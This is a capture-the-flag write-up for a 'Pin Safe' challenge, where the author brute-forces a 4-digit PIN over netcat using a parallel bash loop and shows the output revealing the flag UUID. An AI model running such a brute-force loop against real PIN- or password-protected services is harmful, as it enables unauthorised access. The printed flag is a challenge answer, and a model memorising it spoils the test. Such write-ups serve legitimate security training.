# Pin Safe

## Introduction
```
This is a programming challenge that involves getting pin statements
```

## Goal
```
The goal of this challenge is to get the pin
```

## Flag Format
`UUID`

## Writeup

When we start the provided service we get an IP and a port to connect to. <br/>
```sh
kali@kali nc 152.96.7.10 1337

Main Menu
--------------
1) change pin
2) exit
choose option:
1
enter new pin [4 digit]:
1234
enter old pin [4 digit]:
0000
wrong pin!
``` 

Now getting this reponse it seems like we need to bruteforce a 4 digit PIN. <br/>
Knowing this I coded a small bash script to bruteforce. <br/>
```sh
#!/bin/bash

parallel -j 10 'echo "Try: {}"; echo -e "1\n0000\n{}" | nc [IP] 1337' ::: {0000..9999}
```

I than piped the output into a file. <br/>
```sh
kali@kali bash script.sh > output.txt
```

Watching the output file untill we get the pin. <br/>
```sh
kali@kali watch grep -n "changed" out

40865:pin changed to:
```

Having the line in which something unexpected occured I took a look. <br/>
```sh
cat output.txt | head -n 40870 | tail -n 40860

Main Menu
--------------
1) change pin
2) exit
choose option:
enter new pin [4 digit]:
enter old pin [4 digit]:
pin changed to:
0000
Here is your flag:
445c9fdc-2032-488b-8802-973aa3e0765c

Try 3716
```

This concludes the writeup.
